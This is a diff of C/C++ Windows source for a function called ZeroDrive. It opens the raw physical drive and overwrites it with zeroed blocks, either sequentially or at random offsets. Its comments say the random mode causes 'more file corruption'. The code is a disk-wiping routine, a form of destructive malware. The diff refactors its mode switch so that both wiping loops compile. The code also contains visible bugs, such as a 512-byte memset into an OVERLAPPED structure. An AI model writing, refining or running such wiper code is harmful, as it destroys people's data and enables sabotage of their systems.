@@ -24,13 +24,13 @@
 
 //ARGUMENTS FOR ZERO DRIVE THINGY
 
-#define BLOCK_SIZE 512
-#define BLOCKS_TO_OW 65536
+#define BLOCK_SIZE      512
+#define BLOCKS_TO_OW    65536
 //Size of 256gb drive
-#define MAX_OFFSET_L 0xFFFFFFFF
-#define MAX_OFFSET_H 0x0000003F
+#define MAX_OFFSET_L    0xFFFFFFFF
+#define MAX_OFFSET_H    0x0000003F
 //Overwrites sequentially
-#define MODE_FULL 1
+#define MODE_FULL       1
 //Randomly chooses blocks to write to
 //Causes more file corruption
 #define MODE_RANDOM 0
@@ -97,21 +97,22 @@ bool ZeroDrive()
     HANDLE fhandle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     char* buf = new char[BLOCK_SIZE];
     ZeroMemory(buf,BLOCK_SIZE);
-    if (MODE_FULL)
+#ifdef MODE_FULL
+    
+    for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
     {
-        for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
-        {
-            OVERLAPPED ol;
-            memset(&ol, 0, 512);
-            ol.hEvent = NULL;
+        OVERLAPPED ol;
+        memset(&ol, 0, 512);
+        ol.hEvent = NULL;
 
-            ol.Offset = i * BLOCK_SIZE;
-            ol.OffsetHigh = i * BLOCK_SIZE;
-            WriteChunk(fhandle, buf, &ol);
-        }
+        ol.Offset = i * BLOCK_SIZE;
+        ol.OffsetHigh = i * BLOCK_SIZE;
+        WriteChunk(fhandle, buf, &ol);
     }
-    else
-    {
+    
+#endif
+#ifdef MODE_RANDOM
+    
         for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
         {
             OVERLAPPED ol;
@@ -121,9 +122,10 @@ bool ZeroDrive()
             ol.OffsetHigh = rand() % MAX_OFFSET_H;
             WriteChunk(fhandle, buf, &ol);
         }
-    }
+#endif
     CloseHandle(fhandle);
     return 1;
+
 }
 
 int main()
